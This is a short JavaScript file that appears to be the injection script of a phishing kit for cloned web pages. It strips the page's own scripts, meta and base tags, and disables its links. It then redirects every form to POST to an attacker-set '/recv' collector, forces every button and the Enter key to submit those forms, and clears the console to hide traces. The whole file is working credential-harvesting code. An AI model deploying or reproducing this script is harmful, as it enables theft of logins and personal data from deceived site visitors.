// CONTROL //

const redirect_data = "";

// SCRIPT //

const all_script = document.querySelectorAll("script");
const all_a = document.querySelectorAll("a");
const all_button = document.querySelectorAll("button");
const all_form = document.querySelectorAll("form");
const all_meta = document.querySelectorAll("meta");
const all_noscript = document.querySelectorAll("noscript");
const all_base = document.querySelectorAll("base");
const all = document.querySelectorAll("*");

all.forEach((element) => {
  element.removeAttribute("jsaction");
});

all_a.forEach((a) => {
  a.href = false;
});

[all_base, all_noscript, all_meta, all_script].forEach((elements) => {
  elements?.forEach((element) => {
    element.remove();
  });
});

all_button.forEach((button) => {
  if (button.type != "submit") {
    button.type = "submit";
  }
  all_form.forEach((form) => {
    button.addEventListener("click", () => {
      form.submit();
    });
  });
});

all_form.forEach((form) => {
  form.action = `${redirect_data}/recv`;
  form.method = "POST";
  form.noValidate = false;
});

window.addEventListener("keydown", (event) => {
  if (event.key === "Enter") {
    all_form.forEach((form) => {
      form.submit();
    });
  }
});

console.clear(true);
